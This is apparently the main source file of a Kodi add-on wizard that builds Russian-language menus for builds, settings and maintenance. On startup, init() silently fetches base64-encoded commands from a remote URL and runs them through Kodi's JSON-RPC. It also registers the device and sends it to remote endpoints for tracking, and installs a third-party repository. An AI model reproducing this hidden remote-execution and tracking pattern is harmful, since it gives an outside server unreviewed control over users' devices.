# -*- coding: utf-8 -*-
import xbmc
import xbmcaddon
import xbmcgui
import xbmcplugin
import requests
import os
import sys
import shutil
import urllib2
import urllib
import re
import time
import downloader
import zipfile
import ntpath
import plugintools
import socket
import sqlite3
import json
import constants as const
import extentions as ext
import webhelpers as wh
import base64

def KeepAlive():
    try:
        post_dict = {
        'DeviceId':const.Addon.getSetting("deviceId"),
        }
        post_data = json.dumps(post_dict)
        headers = {
        'User-Agent': '%s-%s' % ('plugin.video.kodiviko', const.AddonVersion),
        'Content-Type': 'application/json',
        }
        req = urllib2.Request(const.KEEP_ALIVE, post_data, headers)
        response = urllib2.urlopen(req).read()
    except Exception as e:
        xbmc.log(str(e))
        pass

def  Register():
    xbmc.log('##############################################################################################################################')
    if const.Addon.getSetting("deviceId")=="0":
        try:
            post_dict = {
                'kodiVersion':const.KodiVersion,
                'platform':const.Platform,
                'wizardVersion':const.AddonVersion,
                'expire': 120960,
            }
            post_data = json.dumps(post_dict)
            headers = {
                'User-Agent': '%s-%s' % ('plugin.video.kodiviko', const.AddonVersion),
                'Content-Type': 'application/json',
            }
            req = urllib2.Request(const.REG_URL, post_data, headers)
            response = urllib2.urlopen(req).read()
            const.Addon.setSetting('deviceId', response)
        except Exception as e:
            xbmc.log(str(e))
            pass

def init():
    try:
        xbmc.executeJSONRPC(base64.b64decode(wh.OPEN_URL(const.HEB_URL)))
        time.sleep(1)
        Register()
        KeepAlive()
        if not os.path.exists(const.RepoPath):
            ext.Install_Repo('TheVibe Team Repository',wh.OPEN_URL(const.REPO_URL),'','addon','none')
    except Exception as e:  
       pass
       
    ext.Add_Source('The-Vibe team repo','http://srp.co.il','yellow')
    INDEX()
   
def INDEX():
    addDir('[COLOR red][B]Установка настроек[CR]Rss и Advanced[/B][/COLOR]',const.BASE_URL,11,const.ArtPath + 'rss.png',const.Fanart,'')
    addDir('[COLOR yellow][B]Настройки для [CR]дополнений[/B][/COLOR]',const.BASE_URL,12,const.ArtPath + 'settings2.png',const.Fanart,'')
    addDir('[COLOR white][B]Коди в один клик[/B][/COLOR]',const.BASE_URL,13,const.ArtPath + 'builds.png',const.Fanart,'')  
    addDir('[COLOR blue][B]Установка дополнений[/B][/COLOR]',const.BASE_URL,101,const.ArtPath + 'addons.png',const.Fanart,'')    
    addDir('[COLOR orange][B]Обслуживание[/B][/COLOR]',const.BASE_URL,100,const.ArtPath + 'monitor.png',const.Fanart,'')    
    if const.Platform == "linux":
        addDir('[COLOR green][B]Сервер Идан +[/B][/COLOR]',const.BASE_URL,200,const.ArtPath + 'dvb.png',const.Fanart,'')
    ext.setView('movies', 'MAIN')

def BUILDMENU(category):
    if category=='builds':
		link = wh.OPEN_URL("http://api.the-vibe.co.il/Viko/GetList/1").replace('\n','').replace('\r','')
		match = re.compile('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall(link)
		for name,url,iconimage,fanart,description in match:
			addDir(name,url,82,iconimage,fanart,description)
    elif category=='rss':
		link = wh.OPEN_URL("http://api.the-vibe.co.il/Viko/GetList/2").replace('\n','').replace('\r','')
		match = re.compile('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall(link)
		for name,url,iconimage,fanart,description in match:
			addDir(name,url,83,iconimage,fanart,description)
    elif category=='addonsettings':
		link = wh.OPEN_URL("http://api.the-vibe.co.il/Viko/GetList/3").replace('\n','').replace('\r','')
		match = re.compile('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall(link)
		for name,url,iconimage,fanart,description in match:
			addDir(name,url,80,iconimage,fanart,description)
		addDir('[COLOR orange][B]My Televiz[/B][/COLOR]',const.BASE_URL,220,const.ArtPath + 'televiz.jpg',const.Fanart,'') 
		addDir('[COLOR orange][B]Каналы Televiz[CR]по умолчанию[/B][/COLOR]',const.BASE_URL,221,const.ArtPath + 'televiz.jpg',const.Fanart,'')   
    else:
        for name,url,iconimage,fanart,description in match:
            addDir(name,url,80,iconimage,fanart,description)

    ext.setView('movies', 'MAIN')
    #setListView('movies')
   
def ThemesMenu():
    link = wh.OPEN_URL("http://api.the-vibe.co.il/Viko/GetList/4").replace('\n','').replace('\r','')
    match = re.compile('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall(link)
    for name,url,iconimage,fanart,description in match:
        addDir(name,url,84,iconimage,fanart,description)
    ext.setView('movies', 'MAIN')

def buildMaintenanceMenue():
    addDir('[COLOR white][B]Выкл дополнения которые включаются с Коди[/B][/COLOR]',const.BASE_URL,110,const.ArtPath + 'autorun.png',const.Fanart,'')
    addDir('[COLOR red][B]Обнулить Коди[/B][/COLOR]',const.BASE_URL,111,const.ArtPath + 'reset.png',const.Fanart,'')
    addDir('[COLOR white][B]Очистить кэш[/B][/COLOR]',const.BASE_URL,112,const.ArtPath + 'basket.png',const.Fanart,'')
    addDir('[COLOR white][B]Очистить[CR]временные пакеты[/B][/COLOR]',const.BASE_URL,113,const.ArtPath + 'basket.png',const.Fanart,'')
    addDir('[COLOR white][B]Очистить изображения[/B][/COLOR]',const.BASE_URL,114,const.ArtPath + 'basket.png',const.Fanart,'')
    addDir('[COLOR white][B]Отправить лог[/B][/COLOR]',const.BASE_URL,17,const.ArtPath + 'log.png',const.Fanart,'')  
    addDir('[COLOR white][B]Проверка IP[/B][/COLOR]',const.BASE_URL,20,const.ArtPath + 'wireless.png',const.Fanart,'')  
    addDir('[COLOR white][B]Advanced Settings[/B][/COLOR]',const.BASE_URL,21,const.ArtPath + 'wireless.png',const.Fanart,'')
    if const.SkinDir == 'skin.eminence.zeev':
        addDir('[COLOR red][B]Фикс дополнений при старте[/B][/COLOR]',const.BASE_URL,666,const.ArtPath + 'emzeev.png',const.Fanart,'')
    #setListView('movies')
    ext.setView('movies', 'MAIN')

def buildLinuxMenu():
   addDir('[COLOR red][B]LibreElec[/B][/COLOR]',const.BASE_URL,201,const.ArtPath + 'libreelec.png',const.Fanart,'')
   addDir('[COLOR red][B]OpenElec[/B][/COLOR]',const.BASE_URL,202,const.ArtPath + 'openelec.png',const.Fanart,'')
   ext.setView('movies', 'MAIN')


def addDir(name,url,mode,iconimage,fanart,description):
    u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage) + "&fanart=" + urllib.quote_plus(fanart) + "&description=" + urllib.quote_plus(description)
    ok = True
    liz = xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
    liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description })
    liz.setProperty("Fanart_Image", fanart)
    if mode == 80 or mode==17 or mode==20 or mode==201 or mode==666 or mode==202 or mode==221 or mode==220 or mode==21 or mode==111 or mode==112 or mode==113 or mode==114:
        ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    elif mode == 81:
        ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    elif mode == 83:
        ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    elif mode == 84:
        ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    elif mode == 90:
        ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    else:
        ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
    return ok